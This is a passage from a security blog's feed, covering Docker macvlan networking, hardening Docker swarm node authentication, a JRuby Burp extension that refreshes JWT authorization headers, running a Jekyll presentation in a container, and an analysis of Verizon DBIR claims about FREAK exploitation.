&lt;/div&gt;

&lt;p&gt;So in this example our host network’s subnet is 192.168.41.0/24 and our gateway is just the default gateway for that network.  Where it gets a little interesting is that we need to specify an ip range that docker can use to hand out to containers that connect to this network.  At the moment there’s no supported way to get containers connecting to a macvlan network to use the host network’s DHCP server so you need to either specify an &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip-range &lt;/code&gt; with a range that’s available and doesn’t overlap with a DHCP scope on the host network or alternatively you can pass &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip &amp;lt;address&amp;gt;&lt;/code&gt; to the individual &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; commands that we use to create containers on this network.&lt;/p&gt;

&lt;p&gt;Once you’ve created the network it’s just a question of specifying the network to use in the docker run command, so something like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --network=testnet ubuntu:16.04 /bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;should give you a container, likely with an address of 192.168.41.128 in this case.&lt;/p&gt;

&lt;p&gt;A couple of other points worth noting about macvlan support.  You can only have one macvlan or ipvlan network setup on a Docker engine instance at the moment (although obviously you can have multiple containers connected to it), and from the macvlan network, you won’t be able to contact the IP address of the host system.&lt;/p&gt;

&lt;p&gt;For more reading on this topic there’s a great set of articles at hicu.be on &lt;a href=&quot;http://hicu.be/docker-networking-macvlan-bridge-mode-configuration&quot;&gt;macvlan networking&lt;/a&gt; and &lt;a href=&quot;http://hicu.be/bridge-vs-macvlan&quot;&gt;bridges vs macvlan&lt;/a&gt; amongst others.&lt;/p&gt;

</description>
				<pubDate>Sat, 23 Jul 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/07/23/Docker-MacVLAN/</link>
				<guid isPermaLink="true">/blog/2016/07/23/Docker-MacVLAN/</guid>
			</item>
		
			<item>
				<title>A couple of initial thoughts on Docker Swarm mode and 1.12</title>
				<description>&lt;p&gt;It’s Dockercon time of year again, and of course you know what that means… loads of cool new features coming to the Docker ecosystem.  I’ve been (enviously) watching all the action remotely on twitter and various blogs and one of the features that jumped out at me was the new swarm mode for Docker engine. The idea of providing very easy to use clustering features for containerization is of course very attractive, but there are possible security concerns, both with encryption of traffic amongst swarm nodes and authentication/authorisation for systems joining the cluster.&lt;/p&gt;

&lt;p&gt;All the demos from various blogs show the setup of the swarm being super-simple, with only a couple of commands needed to get going (for example &lt;a href=&quot;https://ordina-jworks.github.io/conference/2016/06/20/whats-new-in-docker-112.html&quot;&gt;this post&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;So I thought this was worth a bit of investigation to see what’s happening under the covers.  I set-up a couple of VMs and installed docker 1.12 rc2 on both.&lt;/p&gt;

&lt;h1 id=&quot;network-attack-surface&quot;&gt;Network Attack Surface&lt;/h1&gt;

&lt;p&gt;Starting with the master node, after installing docker engine but before running &lt;code class=&quot;highlighter-rouge&quot;&gt;docker swarm init&lt;/code&gt; there are no network connections belonging to the docker process as, by default it only listens on the unix socket. After initializing the swarm, we can see they look like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112manager:~$ sudo netstat -tunap
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.41.185:7946     0.0.0.0:*               LISTEN      1064/dockerd
tcp6       0      0 :::2377                 :::*                    LISTEN      1064/dockerd
tcp6       0      0 127.0.0.1:2377          127.0.0.1:58742         ESTABLISHED 1064/dockerd
udp        0      0 192.168.41.185:7946     0.0.0.0:*                           1064/dockerd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from that we can see that running the swarm command adds some services listening on 7946/TCP and UDP and 2377/TCP.  From &lt;a href=&quot;https://docs.docker.com/engine/swarm/swarm-tutorial/&quot;&gt;the documentation&lt;/a&gt; we can see that these are used for cluster management and node communications.  This is kind of interesting from a security standpoint as it means that we have a network attack surface to look at, which for vanilla docker engine we didn’t.&lt;/p&gt;

&lt;h1 id=&quot;lack-of-authentication&quot;&gt;(Lack) of Authentication&lt;/h1&gt;

&lt;p&gt;Possibly more interesting, is how authentication for swarm nodes is set-up by default.&lt;/p&gt;

&lt;p&gt;After we’ve got our swarm started, we can go to our worker node and just type &lt;code class=&quot;highlighter-rouge&quot;&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377&lt;/code&gt; and we’re joined to the swarm.  Indeed really easy.&lt;/p&gt;

&lt;p&gt;From this the more security minded amongst you will have noticed something…. We weren’t asked for any credentials when joining the swarm!  So by default, anyone running docker-engine on a network that can contact the master can join the swarm and be assigned workloads as part of the swarm.&lt;/p&gt;

&lt;p&gt;Whilst this is obviously a nice setup for ease of development, I’d strongly recommend changing the defaults here if you’re running this in production.  As expected from &lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/swarm_init/&quot;&gt;the documentation&lt;/a&gt; there are options which can be run at swarm creation time to improve this situation.&lt;/p&gt;

&lt;p&gt;Firstly the autoaccept policy of the swarm can be changed.  This determines whether a swarm will automatically add new nodes or whether a manager has to explicitly accept them.  We can change the auto-accept policy with a command to our existing swarm&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@docker112manager:/etc/systemd/network# docker swarm update --auto-accept none
Swarm updated.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After this if we try to join a node to a swarm we get this message&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377
Error response from daemon: Your node is in the process of joining the cluster but needs to be accepted by existing cluster member.
To accept this node into cluster run &quot;docker node accept epy504pa1vr9oe4p3fvsp6fp7&quot; in an existing cluster manager. Use &quot;docker info&quot; command to see the current Swarm status of your node.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The other option we have to improve the situation with regard to node authentication is to specify a secret required to joing the swarm.  To specify a secret you just add it to the init command or use swarm update. For example:-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112manager:~$ docker swarm init --secret loremipsum123
Swarm initialized: current node (0qkezlwlccd7wfuadshi77zsy) is now a manager.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and then if you try to join this swarm without specifying the secret, Docker will throw an error&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377
Error response from daemon: rpc error: code = 3 desc = A valid secret token is necessary to join this cluster: invalid policy or secret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once you’re all setup with your secrets specified and your auto-accept policy set, you’re good to get started setting up services and deploying containers over the swarm.&lt;/p&gt;
</description>
				<pubDate>Sun, 19 Jun 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/06/19/Docker-Swarm/</link>
				<guid isPermaLink="true">/blog/2016/06/19/Docker-Swarm/</guid>
			</item>
		
			<item>
				<title>Burp Plugin for use with JWT Tokens</title>
				<description>&lt;p&gt;One of the things that you get used to after using &lt;a href=&quot;https://portswigger.net/&quot;&gt;Burp&lt;/a&gt; for a while is that if there’s any area that it doesn’t have native functionality for, it’s possible to use Extender to code up your own.  I had cause to do a bit of this recently and as with the previous time I looked at this (&lt;a href=&quot;https://raesene.github.io/blog/2015/01/15/burp-passive-scanner-plugins-with-jruby/&quot;&gt;for passive scanner checks&lt;/a&gt;) there were some gaps in the documentation for doing this with JRuby, so I thought I’d write it up.&lt;/p&gt;

&lt;p&gt;This time, I was looking to automate the process of getting a new JWT token as a session handling rule for an application that needed a new token with each request.  Burp has pretty good session handling rules, but AFAIK at the moment they don’t cover the scenario where you need to embed your value into an HTTP header (as you do with JWT tokens sometimes).&lt;/p&gt;

&lt;p&gt;To do this what I did was write some code that implemented the ISessionHandlingAction interface using JRuby.  It’s a pretty simple interface, just two methods, so it wasn’t too tricky to get working.&lt;/p&gt;

&lt;p&gt;The main action you need to look at is called &lt;code class=&quot;highlighter-rouge&quot;&gt;performAction&lt;/code&gt; which takes two parameters which represent the request to be modified and the results of any macros that have been run.  That second part is important as using a macro is how we’re going to get our token to inject into the request.&lt;/p&gt;

&lt;p&gt;So first we set a couple of variables with the information from our two input requests.  We use these later on to get information about the requests that we need to extract data from them&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#This analyses the request that we&#39;re going to modify&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;analyzeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#This gets the first response from a macro item... should work for the basic case&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_response_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;analyzeResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macroItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The next bit is to get the token out of our macro response.  the idea of this process is that we use a burp macro to replay a request which generates a new token and then we extract it and insert it into new requests, so we’ll need that token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Extract the JWT token from the macro response&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macroItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macro_response_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBodyOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macro_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytesToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;jwt_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jwt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Next up we need to ensure that any existing Authorization header is removed before we add our new one.  This code is a bit brittle at the moment as it doesn’t account for cases where you have other authorization headers you might want (e.g. an HTTP basic one) or cases where there are multiple headers to remove.&lt;/p&gt;

&lt;p&gt;One thing I found a little tricky in this, coming from a ruby background, was the handling of removing an element from the array.  If you were doing this in ruby you might use &lt;code class=&quot;highlighter-rouge&quot;&gt;delete!&lt;/code&gt; to remove the element, but it’s important to note that the getHeaders call doesn’t return a ruby array, it returns a Java ArrayList which has a different set of methods altogether.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Get the headers from our base request&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#we need a ref for the existing authorisation header if any to delete&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#So headers is an ArrayList so no ruby delete methods first iterate over and get our header&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/Authorization: JWT/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#then remove the header if it exists &lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Then with our new JWT token in hand and any previous one removed we just add our token into the request and send it on its way&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Add in our new authorization header&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Authorization: JWT &#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#We need to get the body to add to our headers which is what the next three lines do&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;body_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBodyOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Now we can create our new message with the headers and body that we need&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;new_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;buildHttpMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Lets just log something so we know it&#39;s doing something&lt;/span&gt;
&lt;span class=&quot;vi&quot;&gt;@stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Changed a message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Set our Request to be the modified version from our code.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once we’ve got this plugin working, we can add it to a session handling rule in Burp’s project options.  You set the action to be “run macro” and then in macro handling there’s an option to invoke your extension after running the macro.  If you’ve loaded the plugin into burp ok, your plugin name should be on the drop down and you can insert it to have it run.&lt;/p&gt;

&lt;p&gt;The final code is up on my &lt;a href=&quot;https://github.com/raesene/burp_sample_plugins/blob/master/test_header_injection.rb&quot;&gt;github&lt;/a&gt;.&lt;/p&gt;
</description>
				<pubDate>Sun, 19 Jun 2016 10:01:39 +0100</pubDate>
				<link>/blog/2016/06/19/Burp-Plugin-JWT-Tokens/</link>
				<guid isPermaLink="true">/blog/2016/06/19/Burp-Plugin-JWT-Tokens/</guid>
			</item>
		
			<item>
				<title>Presenting from a Docker Container</title>
				<description>&lt;p&gt;I’ve been presenting a bit recently on &lt;a href=&quot;http://www.docker.com&quot;&gt;docker&lt;/a&gt; and in an attempt to keep my presentation environment relatively simple, I decided to move off from using prezi which doesn’t have a linux client to something a bit more platform agnostic.&lt;/p&gt;

&lt;p&gt;After some looking around I settled on using &lt;a href=&quot;https://github.com/dploeger/jekyll-revealjs&quot;&gt;jekyll-revealjs&lt;/a&gt; which combines &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; publishing with the &lt;a href=&quot;http://lab.hakim.se/reveal-js/#/&quot;&gt;Reveal.JS&lt;/a&gt; HTML/JS presentation framework.&lt;/p&gt;

&lt;p&gt;This turns out to have quite a nice workflow for creating presentations as all your content is a series of markdown files and you can just commit changes to a git repository, which makes updating and modifying content for your presentation very easy, basically anywhere with a text editor does the job.&lt;/p&gt;

&lt;p&gt;Also once your presentation is complete you can access from any machine with a browser, which removes the ties of having to run on a specific operating system with specific presentation software installed.&lt;/p&gt;

&lt;p&gt;All that said, one slight downside which occurred to me is that whilst editing the presentation is as simple as running a text editor, when you’re presenting you need a working jekyll environment with a valid ruby install and the attendant gems. This sounded like a classic case where …. you guessed it…. Docker comes in handy !&lt;/p&gt;

&lt;p&gt;So I turned my presentation into a docker container :)&lt;/p&gt;

&lt;p&gt;The Dockerfile to do this was really pretty straightforward&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM jekyll/jekyll
MAINTAINER Rory McCune &amp;lt;rorym@mccune.org.uk&amp;gt;
RUN mkdir /presentation
WORKDIR /presentation/
ADD . /presentation/
RUN chown -R 1000:1000 /presentation/*
CMD [&quot;jekyll&quot;, &quot;serve&quot;, &quot;-H&quot;, &quot;0.0.0.0&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from the base jekyll install it basically just adds the git working directory to the image and runs jekyll to serve up the presentation.  The only gotcha I encountered was that the jekyll image very sensibly doesn’t run as root, so you need to chown your presentation files appropriately to avoid permission issues when you run the container.&lt;/p&gt;

&lt;p&gt;This is also a useful time to use a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dockerignore&lt;/code&gt; file to avoid the container getting all the git history which it doesn’t need&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.git
.gitignore
README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After that it’s just a questions of running the container and exposing the relevant port, and your presentation will run from any machine that has docker installed and a browser to view the content.&lt;/p&gt;

&lt;p&gt;In my case it’s let me have a backup of my talk sitting on a &lt;a href=&quot;http://presentation.pwndland.uk&quot;&gt;web server&lt;/a&gt; in case of last minute laptop problems.  I may also have created a Kubernetes cluster to run it, but that’s a story for another blog post :)&lt;/p&gt;
</description>
				<pubDate>Mon, 06 Jun 2016 10:01:39 +0100</pubDate>
				<link>/blog/2016/06/06/Presentation-In-A-Docker-Container/</link>
				<guid isPermaLink="true">/blog/2016/06/06/Presentation-In-A-Docker-Container/</guid>
			</item>
		
			<item>
				<title>Verizon DBIR Vulnerabilities Redux</title>
				<description>&lt;p&gt;Since my &lt;a href=&quot;https://raesene.github.io/blog/2016/04/30/Verizon-DBIR-Vulns-And-Cold-Fusion/&quot;&gt;last post&lt;/a&gt; on this there have been quite a few conversations had on twitter and we’ve now got &lt;a href=&quot;http://blog.kennasecurity.com/2016/05/collaborative-data-science-inside-the-2016-verizon-dbir-vulnerability-section/&quot;&gt;Kenna’s blog post&lt;/a&gt; with additional details on their methodology.&lt;/p&gt;

&lt;p&gt;I’m not going to try and cover the whole Top 10 but I think it’s worth looking at what Kenna have mentioned specifically with regards to the two FREAK vulnerabilities that I looked at last time. From Kenna’s blog post they define “Successful Exploitation” as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Successful Exploitation is defined as one successful technical exploitation of a vulnerability on one machine at a particular timestamp. The event is defined as: 
1. An asset has a known CVE open. 
2. An attack come in that matches the signature for that CVE on that asset and 
3. One or more IOCs are detected/correlated post attack
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The “mystery sauce” here is part 3 around IOCs to detect a successful exploit, as that’s tricky to do with a MiTM attack like the two FREAK CVEs.  Attackers who successfully exploited that may just intercept sensitive data from the connection and them misuse it elsewhere, which is virtually impossible to correlate.&lt;/p&gt;

&lt;p&gt;Kenna also provided some interesting graphs for these vulns &lt;a href=&quot;http://www.stathat.com/s/4813HmgKhyPk&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.stathat.com/s/YSHQp2H6OAin&quot;&gt;here&lt;/a&gt; which show large spikes of activity initially followed by periodic smaller spikes through the year.&lt;/p&gt;

&lt;p&gt;Now, to me, that doesn’t really seem to fit a real attack on this issue as I kind of doubt that many people have the ability to crack 800k even weak RSA keys at once, also if someone had compromised that volume of SSL connections in a short space of time you’d have thought there would’ve been some fallout from it…&lt;/p&gt;

&lt;p&gt;However, what it does match is someone running a scanning tool over the large parts of the Internet looking for this vulnerability.  A scanning tool for this will negotiate a connection using the weak RSA keys, that’s how they work.&lt;/p&gt;

&lt;p&gt;Looking at the graph for CVE-2015-0204, we can see a …. huge spike in activity around March 2015, when… the researchers for the FREAK attack did a large scan looking for the issue. Looking at the &lt;a href=&quot;&quot;&gt;Freak Attack&lt;/a&gt; page we see a note&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The following sites from the Alexa Top 10,000 websites permit RSA_EXPORT cipher suites, which potentially puts their users at risk from the FREAK attack. This list is current as of March 10 at 8:00 AM EST. 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;indicating that they did a big scan in March 2015 which roughly correlates with the big spike in Kenna’s graph.  I’d also guess that a lot of other researchers would scan around that time as it was when the vulnerability was released.&lt;/p&gt;

&lt;p&gt;So whilst I can’t be really sure, if I was a betting man, I’d suggest that Kenna’s data doesn’t point to a sophisticated attacker exploiting an SSL MITM issue, but to a group of security researchers scanning a large number of sites after they had announced their vulnerability.&lt;/p&gt;

&lt;p&gt;The only mystery then is “what was the IOC seen on the affected hosts?”.&lt;/p&gt;

</description>
				<pubDate>Mon, 02 May 2016 10:01:39 +0100</pubDate>
				<link>/blog/2016/05/02/Verizon-DBIR-Vulns-Redux/</link>
				<guid isPermaLink="true">/blog/2016/05/02/Verizon-DBIR-Vulns-Redux/</guid>
			</item>
		
			<item>
				<title>Verizon DBIR, Vulnerabilities and Cold Fusion</title>
				<description>&lt;p&gt;So it’s Verizon DBIR time of year again and as with last year there seems to be a little bit of debate around the Top 10 exploited CVEs.  My twitter handle got copied in via some tweets from last year, so I thought I’d take the opportunity of providing a tester’s perspective on this. A more detailed and comprehensive look at this issue is available on the &lt;a href=&quot;https://blog.osvdb.org/2016/04/27/a-note-on-the-verizon-dbir-2016-vulnerabilities-claims/&quot;&gt;OSVDB Blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The thing that sprung out to me from the list was the first two mentioned as top 10 successfully exploited issues on the OSVDB blog.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2015-03-05 – CVE-2015-1637 – Microsoft Windows Secure Channel (Schannel) RSA Temporary Key Handling EXPORT_RSA Ciphers Downgrade MitM (FREAK)&lt;/li&gt;
